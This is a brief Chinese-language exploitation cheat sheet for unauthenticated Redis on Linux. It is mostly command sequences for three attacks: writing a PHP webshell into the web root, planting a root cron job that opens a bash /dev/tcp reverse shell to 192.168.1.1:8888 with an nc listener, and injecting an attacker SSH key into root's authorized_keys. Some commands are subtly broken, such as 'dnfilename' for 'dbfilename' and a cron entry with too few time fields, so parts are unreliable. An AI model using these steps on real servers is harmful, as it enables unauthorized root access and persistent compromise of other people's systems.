## redis未授权（LINUX）

#### 一、写入WEBSHELL

**利用前提**

> 1.知道web目录的路径
>
> 2.redis有web目录的写入权限

过程：

```
--> config set dir  /var/www/html

--> config set dbfilename  shell.php

--> set x " <?php phpinfo()?>"

--> save
```

#### 二、计划任务弹shell

**利用前提**

> 1. redis以root权限运行

```
--> set  x "\n\n***  bash -i >& /dev/tcp/192.168.1.1/8888 0>&1 \n\n"

--> config set dir /var/spool/cron/crontabs/

--> config set dbfilename root

--> save
```

> > 在攻击机中监听 8888 端口

```
--> nc -lvvp 8888
```

#### 三、ssh免密登录

> 1.在攻击机中生成一对公私钥

```
--> ssh-keygen -t rsa
```

> 生成的`id_rsa`室私钥，`id_rsa.pub`是公钥，将公钥写入目标机

```
--> config set dir /root/.ssh

--> config set dnfilename authorized_keys

--> set x "id_rsa.pub的内容"

--> save
```

> 在利用私钥去登录ssh

`ssh -i id_rsa  root@192.168.1.1`

